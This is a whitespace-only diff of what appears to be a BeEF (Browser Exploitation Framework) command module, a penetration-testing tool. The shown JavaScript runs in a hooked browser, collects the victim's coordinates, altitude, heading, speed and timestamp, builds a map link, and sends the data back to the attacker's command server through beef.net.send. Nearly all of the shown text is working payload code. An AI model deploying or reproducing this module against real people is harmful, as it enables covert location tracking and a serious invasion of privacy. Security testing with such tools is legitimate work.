@@ -8,7 +8,7 @@
 //
 beef.execute(function() {
     var onSuccess = function(position) {
-        result = 
+        result =
           'Latitude: '          + position.coords.latitude          + '\n' +
           'Longitude: '         + position.coords.longitude         + '\n' +
           'Altitude: '          + position.coords.altitude          + '\n' +
@@ -17,8 +17,8 @@ beef.execute(function() {
           'Heading: '           + position.coords.heading           + '\n' +
           'Speed: '             + position.coords.speed             + '\n' +
           'Timestamp: '         + new Date(position.timestamp)      + '\n' ;
- 
-       map = 'Map url: http://maps.google.com/?ll='+ 
+
+       map = 'Map url: http://maps.google.com/?ll='+
             position.coords.latitude + ',' + position.coords.longitude;
 
         beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result+map );
